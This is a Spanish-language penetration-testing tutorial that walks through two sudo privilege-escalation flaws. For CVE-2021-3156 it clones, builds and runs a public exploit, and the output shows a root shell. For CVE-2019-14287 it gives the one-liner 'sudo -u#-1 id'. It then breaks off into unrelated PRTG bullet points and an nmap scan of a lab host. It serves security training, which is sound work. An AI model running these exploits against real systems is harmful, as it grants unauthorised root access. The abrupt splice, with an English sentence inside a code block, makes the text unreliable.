El programa `sudo` se usa en sistemas operativos UNIX como Linux o macOS para iniciar procesos con los derechos de otro usuario. En la mayoría de los casos, se ejecutan comandos que solo están disponibles para administradores. Sirve como una capa adicional de seguridad o una salvaguardia para evitar que el sistema y su contenido sean dañados por usuarios no autorizados. El archivo `/etc/sudoers` especifica qué usuarios o grupos tienen permitido ejecutar programas específicos y con qué privilegios.

```r
cry0l1t3@nix02:~$ sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'
[sudo] password for cry0l1t3:  **********

Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
Defaults        use_pty
root            ALL=(ALL:ALL) ALL
%admin          ALL=(ALL) ALL
%sudo           ALL=(ALL:ALL) ALL
cry0l1t3        ALL=(ALL) /usr/bin/id
@includedir     /etc/sudoers.d
```

Una de las últimas vulnerabilidades de `sudo` lleva el CVE-2021-3156 y se basa en una vulnerabilidad de desbordamiento de búfer basado en el heap. Esto afectó a las versiones de sudo:

- 1.8.31 - Ubuntu 20.04
- 1.8.27 - Debian 10
- 1.9.2 - Fedora 33
- y otras

Para averiguar la versión de `sudo`, el siguiente comando es suficiente:

```r
cry0l1t3@nix02:~$ sudo -V | head -n1

Sudo version 1.8.31
```

Lo interesante de esta vulnerabilidad es que estuvo presente durante más de diez años hasta que fue descubierta. También existe un [Proof-Of-Concept](https://github.com/blasty/CVE-2021-3156) público que se puede usar para esto. Podemos descargarlo en una copia del sistema objetivo que hemos creado o, si tenemos una conexión a internet, directamente en el sistema objetivo.

```r
cry0l1t3@nix02:~$ git clone https://github.com/blasty/CVE-2021-3156.git
cry0l1t3@nix02:~$ cd CVE-2021-3156
cry0l1t3@nix02:~$ make

rm -rf libnss_X
mkdir libnss_X
gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c
```

Al ejecutar el exploit, se nos puede mostrar una lista que enumerará todas las versiones disponibles de los sistemas operativos que pueden verse afectadas por esta vulnerabilidad.

```r
cry0l1t3@nix02:~$ ./sudo-hax-me-a-sandwich

** CVE-2021-3156 PoC by blasty <peter@haxx.in>

  usage: ./sudo-hax-me-a-sandwich <target>

  available targets:
  ------------------------------------------------------------
    0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27
    1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
    2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28
  ------------------------------------------------------------

  manual mode:
    ./sudo-hax-me-a-sandwich <smash_len_a> <smash_len_b> <null_stomp_len> <lc_all_len>
```

Podemos averiguar qué versión del sistema operativo estamos usando con el siguiente comando:

```r
cry0l1t3@nix02:~$ cat /etc/lsb-release

DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal
DISTRIB_DESCRIPTION="Ubuntu 20.04.1 LTS"
```

A continuación, especificamos el ID respectivo para la versión del sistema operativo y ejecutamos el exploit con nuestro payload.

```r
cry0l1t3@nix02:~$ ./sudo-hax-me-a-sandwich 1

** CVE-2021-3156 PoC by blasty <peter@haxx.in>

using target: Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31 ['/usr/bin/sudoedit'] (56, 54, 63, 212)
** pray for your rootshell.. **

# id

uid=0(root) gid=0(root) groups=0(root)
```

## Sudo Policy Bypass

Otra vulnerabilidad fue encontrada en 2019 que afectaba a todas las versiones por debajo de `1.8.28`, lo que permitía la escalación de privilegios incluso con un comando simple. Esta vulnerabilidad tiene el [CVE-2019-14287](https://www.sudo.ws/security/advisories/minus_1_uid/) y requiere solo un requisito previo. Tenía que permitir a un usuario en el archivo `/etc/sudoers` ejecutar un comando específico.

```r
cry0l1t3@nix02:~$ sudo -l
[sudo] password for cry0l1t3: **********

User cry0l1t3 may run the following commands on Penny:
    ALL=(ALL) /usr/bin/id
```

De hecho, `sudo` también permite ejecutar comandos con IDs de usuario específicos, lo que ejecuta el comando con los privilegios del usuario que lleva el ID especificado. El ID del usuario específico se puede leer del archivo `/etc/passwd`.

```r
cry0l1t3@nix02:~$ cat /etc/passwd | grep cry0l1t3

cry0l1t3:x:1005:1005:cry0l1t3,,,:/home/cry0l1t3:/bin/bash
```

Así, el ID para el usuario `cry0l1t3` sería `1005`. Si se ingresa un ID negativo (`-1`) en `sudo`, esto resulta en procesar el ID `0`, que solo tiene `root`. Esto, por lo tanto, llevó a una shell de root inmediata.

```r
cry0l1t3@nix02:~$ sudo -u#-1 id

root@nix02:/home/cry0l1t3# id

uid=0(root) gid=1005(cry0l1t3) groups=1005(cry0l1t3)
```

- Según la empresa, es utilizado por 300,000 usuarios en todo el mundo.
- La empresa que fabrica la herramienta, Paessler, ha estado creando soluciones de monitoreo desde 1997.
- Algunas organizaciones que usan PRTG para monitorear sus redes incluyen el Aeropuerto Internacional de Nápoles, Virginia Tech, 7-Eleven, y [más](https://www.paessler.com/company/casestudies).

A lo largo de los años, PRTG ha sufrido [26 vulnerabilidades](https://www.cvedetails.com/vulnerability-list/vendor_id-5034/product_id-35656/Paessler-Prtg-Network-Monitor.html) que se les asignaron CVEs. De todas estas, solo cuatro tienen exploits públicos fáciles de encontrar: dos cross-site scripting (XSS), una Denial of Service, y una vulnerabilidad de command injection autenticada que cubriremos en esta sección. Es raro ver PRTG expuesto externamente, pero a menudo nos hemos encontrado con PRTG durante pruebas de penetración internas. El box de liberación semanal de HTB [Netmon](https://0xdf.gitlab.io/2019/06/29/htb-netmon.html) muestra PRTG.

## Discovery/Footprinting/Enumeration

Podemos descubrir rápidamente PRTG desde un escaneo de Nmap. Típicamente se puede encontrar en puertos web comunes como 80, 443, o 8080. Es posible cambiar el puerto de la interfaz web en la sección de Setup cuando se inicia sesión como administrador.

```r
sudo nmap -sV -p- --open -T4 10.129.201.50

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-22 15:41 EDT
Stats: 0:00:00 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 0.06% done
Nmap scan report for 10.129.201.50
Host is up (0.11s latency).
Not shown: 65492 closed ports, 24 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp  open  ssl/http      Splunkd httpd
8080/tcp  open  http          Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)
8089/tcp  open  ssl/http      Splunkd httpd
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Now that we've covered Splunk and PRTG let's move on and discuss some common customer service management and configuration management tools and see how we can abuse them during our engagements.
```